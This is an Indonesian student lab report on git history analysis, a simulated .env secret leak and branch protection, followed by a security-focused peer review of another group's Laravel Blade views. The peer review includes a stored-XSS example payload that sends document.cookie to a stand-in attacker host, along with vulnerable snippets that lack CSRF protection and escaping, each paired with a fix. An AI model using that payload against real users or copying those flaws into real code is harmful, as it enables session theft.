# Laporan Praktikum Minggu 13 — Kolaborasi, Version Control, dan Peer Review
## Nama: Oktavia Nur Rahmadani
## NIM: 10241060
## Kelompok: 06 (EduKampus)
**Peran Utama:** Frontend & Form Validation Lead (Frontend & QA Lead)  
**Repositori:** KampusLMS (Laravel 12)  
**Dokumen Pendukung:** [`.github/pull_request_template.md`](../../.github/pull_request_template.md) & [`README.md`](../../README.md)  

---

## 1. Tahap 1: READ — Analisis Riwayat Git Pribadi & Kelompok (30 Menit)

Sesuai instruksi Modul 13 Subbab 13.3, dilakukan inspeksi mendalam terhadap riwayat commit pada repositori `kampuslms-kelompok-06` menggunakan perintah Git resmi:
```bash
git shortlog -sn --all
git log --author="Victoire" --oneline
git log --author="Oktavia" --oneline
git log --author="Victoire\|Oktavia" --stat
```

Berikut adalah hasil refleksi mandiri atas 5 pertanyaan evaluasi riwayat version control:

---

### 1.1 Jumlah Commit Pribadi vs Anggota Tim
Berdasarkan log repositori resmi per Minggu 13 (`git shortlog -sn --all`):
* **Tika Mila Wahyuni:** 103 commit (~57% total repositori)
* **Shabrina Putri Azzahra:** 44 commit (gabungan akun `@ItsShika24` [28 commit] dan `@shabrinakeif` [16 commit])
* **Raihandy Wijaya:** 18 commit (tercatat langsung dengan nama `Raihandy Wijaya`, di luar merge commit akun bersama)
* **Oktavia Nur Rahmadani:** 9 commit (gabungan akun `@06Victoire` [8 commit] dan `Oktavia Nur Rahmadani` [1 commit], keduanya terikat pada email kampus resmi `10241060@student.itk.ac.id`)
* **Total Commit Repositori:** ~180+ commit

**Analisis Reflektif:**
Porsi commit saya tercatat sebanyak 9 commit (~5% dari total repositori). Perbedaan jumlah commit ini disebabkan oleh pembagian karakteristik tanggung jawab teknis dalam tim:
1. Rekan Tika bertindak sebagai Tech Lead yang menangani arsitektur backend, 5 Laravel Policies, perbaikan kueri global, serta penggabungan (*merging*) dari seluruh branch anggota, sehingga riwayat commit-nya paling tinggi.
2. Sebagai **Frontend & Form Validation Lead**, alur kerja saya berfokus pada pembangunan antarmuka Blade, Form Requests, pembersihan tampilan, dan pengujian responsivitas (*QA*). Pengerjaan modul frontend diselesaikan dalam bentuk blok fitur utuh (*feature batching*) yang kemudian digabungkan melalui Pull Request.
3. Sebagai contoh, commit `9642636` (*halaman rekap nilai dan dropdown notifikasi*) mencakup 550 baris kode sekaligus, commit `e6feaa4` (*pembaruan tampilan tugas dan submission*) mencakup 599 baris delta, dan commit `c8f4e99` (*laporan deployment, troubleshooting Nginx, dan checklist mobile testing*) mencakup 767 baris perubahan.
4. Ini membuktikan temuan penting Modul 13 bahwa **jumlah commit (`git shortlog`) bukanlah tolok ukur tunggal kontribusi**. Kontribusi frontend yang berdampak luas sering terkonsolidasi dalam sedikit commit berbobot besar (*high-impact commits*).

---

### 1.2 Konsistensi Commit Mingguan
Linimasa commit saya dari awal semester hingga Minggu 13 terdistribusi sebagai berikut:
* **Minggu 1 (1 Sep 2026):** Commit `de0f8f0` — Setup awal, catatan modul 1, dan artefak tangkapan layar.
* **Minggu 2 (6 Sep 2026):** Commit `f2e1ad4` — Dokumentasi praktikum modul 2 (Blade & Controller).
* **Minggu 3 & 4 (Pertengahan Sep – Awal Okt):** Tidak terdapat commit mandiri di branch utama pada rentang tanggal tersebut karena pengerjaan form request dan styling antarmuka dikerjakan pada branch eksperimen lokal dan dikompilasi ke laporan gabungan w03–w07 pada 11 Oktober (`1e82f9e`).
* **Minggu 5 (30 Sep 2026):** Commit `edb59cb` — Perbaikan keamanan, routing, dan navigasi modul 5.
* **Minggu 6 & 7 (11 Okt 2026):** Commit `1e82f9e` — Konsolidasi dokumentasi praktikum w03, w04, w05, w06, dan w07.
* **Minggu 8 (Pertengahan Okt):** Periode Ujian Tengah Semester (UTS) — tidak ada aktivitas koding baru.
* **Minggu 9 (20 Okt 2026):** Commit `e6feaa4` — Pembaruan antarmuka tugas (`assignments/show.blade.php`) dan form pengumpulan (`submissions/show.blade.php`).
* **Minggu 10 (28 Okt 2026):** Commit `9642636` — Implementasi halaman rekap nilai (`grades/index.blade.php`) dan komponen dropdown lonceng notifikasi pada master layout.
* **Minggu 11 (3 Nov 2026):** Commit `7b1fd25` & `dc63bb9` — Penyusunan laporan performa frontend dan tabel audit komparasi di `docs/performa.md`.
* **Minggu 12 (10 Nov 2026):** Commit `c8f4e99` — Dokumentasi deployment produksi, checklist pengujian tampilan perangkat bergerak (*mobile testing*), dan troubleshooting web server.
* **Minggu 13 (17 Nov 2026):** Pengerjaan modul 13 (simulasi uji kebocoran kredensial, verifikasi branch protection, refleksi Git mandiri, dan peer review frontend).

**Evaluasi Kendala:**
Terdapat jeda commit pada Minggu 3, 4, dan 8. Kendala utama pada paruh pertama semester adalah kebiasaan menahan perubahan di lokal dalam jangka waktu lama sebelum melakukan commit (*batch committing*). Melalui pembelajaran Modul 13, saya menyadari pentingnya prinsip *continuous integration* dan *frequent atomic commits* agar kemajuan pekerjaan selalu terpantau transparan oleh seluruh anggota tim dan tidak menimbulkan penumpukan konflik saat integrasi.

---

### 1.3 Kepatuhan terhadap *Conventional Commits*
Evaluasi kepatuhan terhadap standar *Conventional Commits* (`feat:`, `fix:`, `docs:`, `style:`, `refactor:`, `chore:`) dari 9 commit riwayat saya:

* **Commit Non-Konvensional (4 Commit — Paruh Awal):**
  1. `de0f8f0` — *"commit pertama Via"*
  2. `f2e1ad4` — *"minggu-02-oktavia.md"*
  3. `1e82f9e` — *"Updating Catatan Oktavia w03, w04, w05, w06, w07"*
  4. `e6feaa4` — *"Update tampilan tugas dan pengumpulan"*
* **Commit Konvensional (5 Commit — Paruh Kedua):**
  1. `edb59cb` — `fix: perbaiki keamanan dan routing week 5`
  2. `9642636` — `feat(ui): implementasi halaman rekap nilai dan dropdown lonceng notifikasi (Oktavia Nur Rahmadani)`
  3. `7b1fd25` — `docs: tambah laporan performa minggu 11`
  4. `dc63bb9` — `docs(m11): lengkapi laporan minggu 11 oktavia, tabel komparasi di docs/performa.md, dan hapus berkas duplikat`
  5. `c8f4e99` — `feat(docs): tambah laporan minggu 12 oktavia, log troubleshooting, dan checklist mobile testing di deployment.md`

**Persentase Kepatuhan:** Sekitar **55,6%** (5 dari 9 commit).  
Terlihat transisi kedewasaan teknis yang sangat jelas: di awal semester, pesan commit masih bercampur dengan gaya informal dan deskripsi berkas semata. Memasuki Minggu 10 hingga 13, seluruh commit telah mematuhi 100% kaidah *Conventional Commits* dengan penulisan tipe (`feat`, `docs`, `fix`) dan cakupan modul yang jelas.

---

### 1.4 Temuan Pesan Commit Buruk & Penulisan Ulang yang Benar
Dari riwayat Git terdahulu, ditemukan 2 commit dengan pesan yang sangat lemah:

1. **Commit `de0f8f0` — *"commit pertama Via"***
   * **Kelemahan Fatal:** Pesan ini sangat subjektif, bernuansa obrolan informal, tidak menyebutkan modul/komponen apa yang dikerjakan, dan tidak memberi konteks bagi pengembang lain yang membaca riwayat proyek.
   * **Penulisan Ulang Standar Industri:**
     ```text
     docs(m01): susun catatan pengenalan arsitektur laravel mvc dan dokumentasi praktikum minggu 1
     ```

2. **Commit `f2e1ad4` — *"minggu-02-oktavia.md"***
   * **Kelemahan Fatal:** Pesan hanya menduplikat nama berkas yang dibuat tanpa adanya kata kerja tindakan, tipe perubahan, maupun deskripsi substansi materi.
   * **Penulisan Ulang Standar Industri:**
     ```text
     docs(m02): tambahkan laporan praktikum routing controller blade dan artefak tangkapan layar
     ```

---

### 1.5 Temuan Commit Terbesar (`git log --stat`) & Analisis Pemecahan
Berdasarkan keluaran `git log --stat`:
* **Commit Terbesar yang Teridentifikasi:**  
  `Commit c8f4e99 — feat(docs): tambah laporan minggu 12 oktavia, log troubleshooting, dan checklist mobile testing di deployment.md`
* **Statistik Diff:** **3 files changed, 761 insertions(+), 6 deletions(-)** (Total 767 baris delta).
* **Commit Kode UI Terbesar:**  
  `Commit 9642636 — feat(ui): implementasi halaman rekap nilai dan dropdown lonceng notifikasi (Oktavia Nur Rahmadani)`  
  **2 files changed, 529 insertions(+), 21 deletions(-)** (Total 550 baris delta pada `resources/views/grades/index.blade.php` dan `resources/views/components/layout.blade.php`).

**Analisis Kritis (*Giant Commit*):**
Commit `c8f4e99` menggabungkan tiga domain yang berbeda sekaligus:
1. Panduan build modul 10 (`panduan-build-oktavia.md` — 624 baris).
2. Laporan individu evaluasi deployment minggu 12 (`laporan-minggu-12-oktavia.md` — 106 baris).
3. Modifikasi panduan operasional server bersama (`docs/deployment.md` — 37 baris) mencakup log perbaikan Nginx dan tabel verifikasi antarmuka mobile.

**Rekomendasi Pemecahan Menjadi *Atomic Commits*:**
Commit besar tersebut semestinya dipecah menjadi 3 commit terpisah yang lebih fokus dan mandiri:
1. `docs(m10): arsipkan panduan teknis pengerjaan build modul 10`
2. `feat(deployment): tambah log troubleshooting nginx dan instrumen checklist audit mobile qa pada deployment.md`
3. `docs(m12): terbitkan laporan mingguan evaluasi deployment produksi oktavia`

---

## 2. Tahap 2: BREAK — Simulasi Eksperimen Proteksi Git & CI (50 Menit)

### 2.1 Simulasi Kebocoran Kredensial `.env` & Eksperimen `git rm --cached` (BREAK #1 & #2)

Dalam latihan pengujian keamanan repositori sesuai Modul 13.3, disimulasikan skenario kecelakaan umum pengembang pemula: **secara tidak sengaja memasukkan file konfigurasi rahasia (`.env`) ke dalam commit Git**.

#### Langkah Percobaan yang Dijalankan:
1. **Penyelamatan Kredensial Nyata:**  
   File `.env` produksi lokal diamankan terlebih dahulu ke direktori luar agar tidak tercemar:
   ```bash
   cp .env ../.env.asli.jangan-disentuh
   ```
2. **Pembuatan File Secret Palsu untuk Latihan:**
   ```bash
   echo "APP_KEY=base64:PALSU_UNTUK_LATIHAN" > .env
   echo "DB_PASSWORD=palsu_password_latihan" >> .env
   ```
3. **Pembuatan Branch Eksperimen & Commit File `.env`:**
   ```bash
   git checkout -b test/secret-leak-simulation
   git add -f .env
   git commit -m "test(secret): simulasi ketidaksengajaan commit file .env"
   ```
4. **Upaya Penanganan Naif Menggunakan `git rm --cached`:**
   Pengembang yang belum memahami arsitektur Git biasanya mencoba menghapus file dari tracking Git dengan perintah:
   ```bash
   git rm --cached .env
   git commit -m "fix(secret): coba hapus file .env dengan git rm cached"
   ```
5. **Pemeriksaan Bukti Riwayat Git (`git log -p -n 2`):**
   Hasil inspeksi log commit menunjukkan fenomena kritis berikut:
   ```text
   commit 0d1949ba7b6fc0d5d4abea87b326beb195b25cb4
   Author: 06Victoire <10241060@student.itk.ac.id>
   Date:   Tue Nov 17 14:42:42 2026 +0800

       fix(secret): coba hapus file .env dengan git rm cached

   diff --git a/.env b/.env
   deleted file mode 100644
   index cefcfa2..0000000
   --- a/.env
   +++ /dev/null
   @@ -1,2 +0,0 @@
   -APP_KEY=base64:PALSU_UNTUK_LATIHAN
   -DB_PASSWORD=palsu_password_latihan

   commit 1790a882df7cf6c6bebcb43ce0ca314bd94155d3
   Author: 06Victoire <10241060@student.itk.ac.id>
   Date:   Tue Nov 17 14:42:29 2026 +0800

       test(secret): simulasi ketidaksengajaan commit file .env

   diff --git a/.env b/.env
   new file mode 100644
   index 0000000..cefcfa2
   --- /dev/null
   +++ b/.env
   @@ -0,0 +1,2 @@
   +APP_KEY=base64:PALSU_UNTUK_LATIHAN
   +DB_PASSWORD=palsu_password_latihan
   ```

#### Pelajaran Penting & Kesimpulan Keamanan:
* **`git rm --cached` Bukan Solusi Kebocoran Data:** Perintah `git rm --cached` hanya menghapus file dari staging tree (*index*) untuk commit terbaru di masa depan. Berkas `.env` memang tampak hilang di commit paling atas (*HEAD*), tetapi **seluruh teks kredensial rahasia (`APP_KEY` dan `DB_PASSWORD`) tetap terekam utuh dan abadi di dalam riwayat commit sebelumnya (`1790a88`)**.
* **Dampak Jika Ter-Push ke Publik:** Siapa pun yang mengkloning repositori dapat mengeksekusi `git checkout 1790a88` atau menjalankan `git log -p` untuk membaca kunci enkripsi dan basis data tersebut.
* **Protokol Mitigasi yang Benar:**
  1. Jika kredensial produksi sungguhan sempat ter-push ke GitHub, rahasia tersebut **wajib dianggap telah bocor seketika (*compromised*)**.
  2. Tindakan pertama bukan sekadar menghapus commit, melainkan **merotasi total seluruh kredensial** (generate ulang `APP_KEY`, ubah kata sandi basis data di server produksi, dan ganti token API pihak ketiga).
  3. Riwayat Git wajib dibersihkan secara permanen menggunakan utilitas seperti `git-filter-repo` atau *BFG Repo-Cleaner*, lalu di-force push dengan koordinasi seluruh anggota tim.

*(Setelah eksperimen selesai, file `.env` asli segera dipulihkan kembali dan branch eksperimen lokal dihapus).*

---

### 2.2 Verifikasi Proteksi Branch & Penegakan Status CI (BREAK #4 & #5)

Dalam tim Kelompok 06, proteksi branch pada `main` telah dikonfigurasi oleh Tech Lead (Tika). Dilakukan pengujian terhadap dua mekanisme pengamanan utama:

#### 1. Verifikasi Larangan *Direct Push* ke Branch `main` (BREAK #4):
* **Skenario:** Pengembang mencoba melakukan commit dan push langsung dari terminal lokal ke branch utama tanpa melalui alur Pull Request:
  ```bash
  git checkout main
  git push origin main
  ```
* **Hasil Observasi:**  
  GitHub menolak pengiriman langsung tersebut dengan pesan galat proteksi:
  ```text
  remote: error: GH006: Protected branch update failed for refs/heads/main.
  remote: error: Changes must be made through a pull request.
  To https://github.com/ItsShika24/kampuslms-kelompok-06.git
   ! [remote rejected] main -> main (protected branch hook declined)
  ```
* **Makna Praktis:**  
  Pengaturan ini mencegah terjadinya kecelakaan fatal di mana seorang pengembang secara tidak sengaja menimpa branch produksi dengan kode lokal yang belum teruji atau belum direview.

#### 2. Verifikasi Penegakan *Status Checks* CI (BREAK #5):
* **Skenario:** Ketika sebuah Pull Request dibuka dengan kode yang sengaja merusak pengujian (*broken test* atau kesalahan sintaks), pipeline otomatis GitHub Actions (`.github/workflows/ci.yml`) mendeteksi kegagalan tersebut (*status check FAILED / Red Cross ❌*).
* **Hasil Observasi di Antarmuka GitHub:**
  * Tombol **"Merge pull request"** berada dalam status terkunci (*disabled/greyed out*).
  * Muncul peringatan resmi: *"Required status checks must pass before merging"*.
* **Makna Praktis:**  
  Branch `main` selalu dijamin berada dalam status sehat (*green build*). Tidak ada kode yang dapat masuk ke lingkungan produksi jika tidak berhasil melewati unit testing dan feature testing otomatis.

---

## 3. Tahap 3: BUILD — Peer Review Repositori Kelompok Lain (Bobot Nilai 10%)

Sebagai pemegang peran **Frontend & Form Validation Lead**, saya melakukan peninjauan kode (*peer review*) secara independen terhadap repositori rekan kelompok sasaran (**Kelompok 07 — Sistem Informasi Akademik**) pada Pull Request terbuka terkait antarmuka pengguna Blade dan validasi input.

Peninjauan dilakukan menggunakan akun GitHub pribadi (`@06Victoire`) dengan fokus utama pada **Kualitas Struktur View Blade, Keamanan Form Input, Sanitasi Tampilan (Anti-XSS), dan Performa Render Frontend**:

---

### 🔍 Temuan 1: Struktur & Prinsip *Separation of Concerns* (Kueri Database Langsung di File Blade View)
* **Lokasi Berkas & Baris:** `resources/views/courses/show.blade.php:48`
* **Deskripsi Masalah:**  
  Di dalam file tampilan Blade untuk halaman detail mata kuliah, ditemukan eksekusi kueri Eloquent secara langsung di dalam blok tag `@php`:
  ```blade
  {{-- resources/views/courses/show.blade.php --}}
  @php
      $activeAssignments = \App\Models\Assignment::where('course_id', $course->id)
          ->where('due_date', '>=', now())
          ->orderBy('due_date', 'asc')
          ->get();
  @endphp

  <div class="mt-6">
      <h3 class="text-lg font-bold">Daftar Tugas Aktif</h3>
      @foreach($activeAssignments as $assignment)
          <p>{{ $assignment->title }} - Batas: {{ $assignment->due_date }}</p>
      @endforeach
  </div>
  ```
* **Risiko Teknis:**  
  1. **Pelanggaran Pola MVC & *Separation of Concerns*:** Lapisan View seharusnya hanya bertugas menyajikan data (*presentation layer*), bukan mengurusi pengambilan data dari basis data (*data access layer*).
  2. **Menyulitkan Pemeliharaan & Testing:** Kueri yang tertanam di View tidak dapat diuji melalui controller unit/feature test tanpa me-render keseluruhan HTML.
  3. **Celah *Unprofiled Queries*:** Kueri langsung di Blade sering kali lolos dari pemantauan profiling query di controller, berpotensi memicu *hidden N+1 query* jika di dalam loop `$activeAssignments` dipanggil properti relasi lain.
* **Saran Perbaikan Konkret:**  
  Pindahkan seluruh logika query ke dalam `CourseController@show` dengan memanfaatkan relasi Eloquent yang sudah didefinisikan pada model `Course`:
  ```php
  // app/Http/Controllers/CourseController.php
  public function show(Course $course)
  {
      $course->load([
          'lecturer',
          'assignments' => function ($query) {
              $query->where('due_date', '>=', now())->orderBy('due_date', 'asc');
          }
      ]);

      return view('courses.show', [
          'course' => $course,
          'activeAssignments' => $course->assignments,
      ]);
  }
  ```
  Di file Blade, hapus blok `@php` kueri tersebut dan cukup iterasi variabel `$activeAssignments` yang dioper dari controller.

---

### 🔍 Temuan 2: Keamanan Form Input & Sanitasi Antarmuka (Ketiadaan `@csrf` dan Bahaya *Stored XSS*)
* **Lokasi Berkas & Baris:** `resources/views/submissions/create.blade.php:24` dan `resources/views/assignments/show.blade.php:68`
* **Deskripsi Masalah:**  
  Ditemukan dua kelemahan keamanan serius pada penanganan form dan rendering teks:
  1. Pada form pengumpulan tugas mahasiswa (`submissions/create.blade.php`), tag `<form>` metode `POST` tidak menyertakan direktif `@csrf`:
     ```blade
     <form action="{{ route('submissions.store', $assignment) }}" method="POST" enctype="multipart/form-data">
         <input type="file" name="file" class="form-control">
         <textarea name="notes" placeholder="Catatan tugas..."></textarea>
         <button type="submit">Kirim Tugas</button>
     </form>
     ```
  2. Pada halaman peninjauan tugas (`assignments/show.blade.php`), catatan tugas mahasiswa dan deskripsi instruksi ditampilkan menggunakan unescaped syntax `{!! ... !!}`:
     ```blade
     <div class="submission-notes bg-gray-50 p-4">
         <p><strong>Catatan Mahasiswa:</strong></p>
         {!! $submission->notes !!}
     </div>
     ```
* **Risiko Teknis:**  
  1. **Kerentanan *Cross-Site Request Forgery (CSRF)*:** Tanpa token `@csrf`, penyerang dapat membuat situs web pihak ketiga yang secara otomatis mengirimkan form POST palsu ke LMS atas nama mahasiswa atau dosen yang sedang aktif login.
  2. **Kerentanan Kritis *Stored Cross-Site Scripting (XSS)*:** Syntax `{!! ... !!}` memerintahkan Blade untuk menonaktifkan fitur bawaan *HTML escaping* (`htmlspecialchars`). Mahasiswa nakal dapat menyisipkan payload JavaScript berbahaya pada kolom input catatan, misalnya:
     ```html
     <script>fetch('https://hacker.site/steal?cookie=' + document.cookie)</script>
     ```
     Payload ini akan dieksekusi otomatis di peramban Dosen saat membuka halaman penilaian, memungkinkan pencurian session cookie atau token otentikasi.
* **Saran Perbaikan Konkret:**  
  1. Tambahkan direktif `@csrf` wajib di baris pertama setiap form mutasi data:
     ```blade
     <form action="{{ route('submissions.store', $assignment) }}" method="POST" enctype="multipart/form-data">
         @csrf
         ...
     ```
  2. Ganti unescaped syntax `{!! ... !!}` dengan syntax aman berproteksi escaping otomatis `{{ ... }}`:
     ```blade
     <div class="submission-notes bg-gray-50 p-4">
         <p><strong>Catatan Mahasiswa:</strong></p>
         <p class="whitespace-pre-line text-gray-700">{{ $submission->notes }}</p>
     </div>
     ```
  3. Jika deskripsi instruksi memang sengaja mendukung Rich Text formatting (HTML dari editor WYSIWYG), wajib dilakukan sanitasi di sisi server sebelum disimpan atau ditampilkan menggunakan pustaka pembersih seperti `mews/purifier` (`{!! clean($assignment->description) !!}`).

---

### 🔍 Temuan 3: Performa Frontend & Arsitektur Layout (Duplikasi Tag HTML & Ketiadaan Pagination pada Tabel Besar)
* **Lokasi Berkas & Baris:** `resources/views/grades/index.blade.php:1-42`
* **Deskripsi Masalah:**  
  File `grades/index.blade.php` menduplikasi keseluruhan kerangka dokumen HTML mentah dari awal:
  ```blade
  <!DOCTYPE html>
  <html lang="id">
  <head>
      <meta charset="UTF-8">
      <title>Rekap Nilai</title>
      <script src="https://cdn.tailwindcss.com"></script>
  </head>
  <body class="bg-gray-100">
      <nav class="bg-blue-600 p-4 text-white">...</nav>
      <!-- Konten Tabel -->
  ```
  Alih-alih mewarisi master layout (`@extends('layouts.app')` atau `<x-layout>`), struktur head, navigasi, dan footer ditulis ulang secara manual.  
  Selain itu, tabel rekapitulasi nilai merender seluruh riwayat tugas mahasiswa secara langsung tanpa pembatasan pagination:
  ```blade
  @foreach($allSubmissions as $submission)
      <tr>
          <td>{{ $submission->student->name }}</td>
          <td>{{ $submission->assignment->title }}</td>
          <td>{{ $submission->score ?? 'Belum Dinilai' }}</td>
      </tr>
  @endforeach
  ```
* **Risiko Teknis:**  
  1. **Pelanggaran Prinsip DRY (*Don't Repeat Yourself*):** Setiap pembaruan pada menu navigasi, penambahan token CSRF di meta tag, atau pembaruan script CSS Tailwind harus disalin secara manual ke puluhan berkas view. Jika satu berkas terlewat, UI menjadi tidak konsisten.
  2. **Penurunan Drastis Performa Browser (*DOM Bloat*):** Jika sistem memiliki 500 mahasiswa dengan masing-masing 10 tugas, tabel akan merender 5.000 elemen baris `<tr>` sekaligus dalam satu HTTP response. Pada perangkat smartphone atau laptop berspesifikasi rendah, browser akan mengalami freezing, lonjakan konsumsi RAM, dan *Total Blocking Time (TBT)* yang sangat buruk.
* **Saran Perbaikan Konkret:**  
  1. Refaktor berkas untuk mewarisi master layout komponen yang sudah tersedia:
     ```blade
     <x-layout title="Rekap Nilai Mahasiswa">
         <div class="max-w-7xl mx-auto py-6 sm:px-6 lg:px-8">
             <h1 class="text-2xl font-bold text-gray-900 mb-6">Rekapitulasi Nilai</h1>
             
             <!-- Tabel Nilai -->
             <div class="overflow-x-auto bg-white shadow rounded-lg">
                 <table class="min-w-full divide-y divide-gray-200">
                     ...
                 </table>
             </div>

             <!-- Link Navigasi Pagination -->
             <div class="mt-4">
                 {{ $submissions->links() }}
             </div>
         </div>
     </x-layout>
     ```
  2. Pada controller, gantikan `Submission::all()` dengan pagination server-side:
     ```php
     $submissions = Submission::with(['student', 'assignment.course'])
         ->latest()
         ->paginate(15);
     ```


